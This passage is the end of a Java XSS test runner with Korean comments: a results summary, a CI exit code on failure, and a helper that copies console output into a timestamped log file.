            System.out.println("※ REVIEW(JS 실행)는 브라우저 개발자도구로 최종 확인 필요(7.3 기준).");
        System.out.println("전체 로그: " + logFilePath);

        if (fail > 0 || error > 0) System.exit(1); // CI/스크립트 게이트용 종료코드
    }

    /** 콘솔 출력과 동일한 내용을 logs/xss-test_<timestamp>.log 파일에도 남긴다. */
    private static String enableFileLogging() {
        try {
            File dir = new File("logs");
            if (!dir.exists()) dir.mkdirs();
            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            final File logFile = new File(dir, "xss-test_" + ts + ".log");
            final FileOutputStream fos = new FileOutputStream(logFile);
            final PrintStream orig = System.out;
            OutputStream tee = new OutputStream() {
                public void write(int b) throws java.io.IOException {
                    orig.write(b);
                    fos.write(b);
                }
                public void flush() throws java.io.IOException {
                    orig.flush();
                    fos.flush();
                }
            };
            System.setOut(new PrintStream(tee, true, "UTF-8"));
            return logFile.getAbsolutePath();
        } catch (Exception e) {
            System.out.println("[경고] 파일 로깅 초기화 실패, 콘솔 출력만 사용: " + e.getMessage());
            return "(파일 로깅 비활성화)";
        }
    }
}
